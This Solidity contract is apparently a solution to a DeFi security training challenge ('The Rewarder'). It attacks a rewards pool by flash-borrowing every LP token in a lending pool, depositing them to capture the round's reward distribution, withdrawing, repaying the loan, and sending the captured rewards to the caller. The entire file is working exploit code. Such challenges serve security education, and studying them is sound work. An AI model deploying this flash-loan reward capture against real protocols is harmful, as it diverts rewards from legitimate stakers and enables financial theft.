// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

import "hardhat/console.sol";

contract TheRewarderAttacker {

    address immutable lpToken;
    address immutable rewardToken;
    address immutable loanPool;
    address immutable rewarderPool;
    constructor(address _lpToken, address _rewardToken, address _loanPool, address _rewarderPool) {
        lpToken = _lpToken;
        rewardToken = _rewardToken;
        loanPool = _loanPool;
        rewarderPool = _rewarderPool;
    }
    function attack() external {
        uint256 loanerBalance = ERC20(lpToken).balanceOf(loanPool);
        FlashLoanerPool(loanPool).flashLoan(loanerBalance);

        uint256 rewardBalance = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(msg.sender, rewardBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("LP BALANCE ", ERC20(lpToken).balanceOf(address(this)));
        ERC20(lpToken).approve(rewarderPool, amount);
        TheRewarderPool(rewarderPool).deposit(amount);
        console.log("REWARD BALANCE ", ERC20(rewardToken).balanceOf(address(this)));
        TheRewarderPool(rewarderPool).withdraw(amount);
        
        ERC20(lpToken).transfer(loanPool, amount);
    }
}